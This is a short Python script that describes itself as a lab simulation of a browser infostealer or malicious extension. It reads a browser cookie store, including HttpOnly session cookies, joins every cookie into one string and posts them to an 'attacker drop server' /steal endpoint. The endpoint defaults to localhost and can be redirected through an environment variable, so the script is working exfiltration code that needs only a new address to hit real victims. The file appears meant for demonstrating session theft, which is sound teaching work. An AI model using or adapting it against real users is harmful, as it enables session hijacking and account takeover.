"""
Lab infostealer / malicious-extension simulation. Unlike page JS, it reads the browser's
cookie STORE directly — so HttpOnly does NOT hide the session from it. It exfiltrates every
cookie (including the HttpOnly session) to the attacker drop server. Lab-only.
Usage: stealer.py <cookie_store.json>   (CONSOLE_URL env = drop server)
"""
import json
import os
import sys

import httpx

store = json.load(open(sys.argv[1]))
console = os.environ.get("CONSOLE_URL", "http://localhost:9000").rstrip("/")
jar = "; ".join(f"{c['name']}={c['value']}" for c in store)   # grabs HttpOnly cookies too
httpx.post(f"{console}/steal", json={"src": "infostealer", "data": jar}, timeout=10)
print(f"exfiltrated {len(store)} cookies (incl HttpOnly) to {console}")
